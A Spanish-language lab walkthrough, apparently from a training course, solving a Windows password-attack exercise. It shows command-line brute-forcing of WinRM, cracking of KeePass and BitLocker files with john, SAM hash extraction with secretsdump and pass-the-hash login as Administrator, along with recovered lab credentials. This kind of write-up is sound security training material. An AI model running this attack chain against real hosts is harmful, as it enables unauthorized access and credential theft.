# Password Attack Lab - Hard

## Enunciado

The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user `Johanna` is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.

## Solución 
### nmap
Nos encontramos la siguiente información: 
```textplain
# Nmap 7.94SVN scan initiated Tue Nov 26 14:49:00 2024 as: nmap -p- -v --open -sS --min-rate 5000 -Pn -n -oG openPorts_10.129.202.222 -oN openPorts_10.129.202.222.txt 10.129.202.222
Nmap scan report for 10.129.202.222
Host is up (0.11s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Nov 26 14:49:17 2024 -- 1 IP address (1 host up) scanned in 16.57 seconds
```

### Entrada al sistema - WinRM
Tras hacer fuerza bruta a varios protocolos con `nxc`, encontramos credenciales válidas ejecutando el siguiente comando:
```bash
nxc winrm $target -u 'Johanna' -p mut_password.list | grep [+]
```
encontrando como password válida `1231234!`

En la carpeta del usuario encontramos un arhcivo `logins.kbdx`


### Archivo `logins.kdbx`

- Es un archivo de tipo keepass. Lo movemos a nuestra pwnbox e instalamos keepass 
	```
	sudo apt install keepass2 
	```

	para abrir el arhivo. Comprobamos que está protegido por contraseña.

- Encontramos la contraseña que descomprime el archivo ejecutando lo siguiente: 

	```bash
	keepass2john logins.kbdx > logins.hash
	john --wordlist=mut_password.list logins.hash
	```

	encontrando la siguiente pass: `Qwerty7!`

- En el archivo keepass encontramos las siguientes credenciales:
	- Windows: `david:gRzX7YbeTcDG7`
	- Recicle bin: `User Name:Password`
	- Recicle bin: `Michael321:12345`


### Acceso por SMB como usuario `david`

- Podemos acceder con las credenciales dadas al servicio 
	
	```bash
	nxc smb $target -u 'david' -p 'gRzX7YbeTcDG7' --shares
	```
	Encontramos una carpeta de nombre `david` , y accedemos a su contenido
	
	```bash
	smbclient -U david //$target/david
	```
	
	Allí hay un archivo llamado `backup.vhd` que intentamos descargar, pero nos da un error relacionado con `timeout`. Tras ejecutar `smbclient` del siguiente modo: 
	
	```bash
	smbclient -U david //$target/david -t 120
	```
	ya podemos descargar el contenido del archivo

- Movemos el archivo descargado a una máquina Windows para inspeccionar su contenido, pero está protegido por contraseña. Nos dice que está protegido por BitLocker Drive Encryption. Encontramos la pass que nos permite montar el disco del siguiente modo:
	```
	bitlocker2john -i Backup.vhd > backup.hash
	john --wordlist=mut_password.list backup.hash
	```

	Encontrando que la pass es `123456789!`

- Montamos el archivo en la máquina Windows, utilizando powershell del siguiente modo: 

	```powershell
	Unlock-BitLocker -MountPoint "E:" -Password (Read-Host "Enter BitLocker Password" -AsSecureString)
	```

	Encontrando dos archivos: `SAM` y `SYSTEM`

- Obtenemos los hashes de los usuarios utilizando `secrectsdump` del siguiente modo: 
	```bash
	 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SYSTEM > secretsdump.txt
	```

- Nos conectamos nuevamente utilizando `evil-winrm` y PtH
	```bash
	 cat secretsdump.txt| grep Administrator | grep -oP '(?<=aad3b435b51404eeaad3b435b51404ee:)[a-f0-9]{32}' | tr -d > hashAdmin
	  evil-winrm -i $target -u Administrator -H $(cat hashAdmin)

	```

	Lo que nos permite obtener la flag 

	


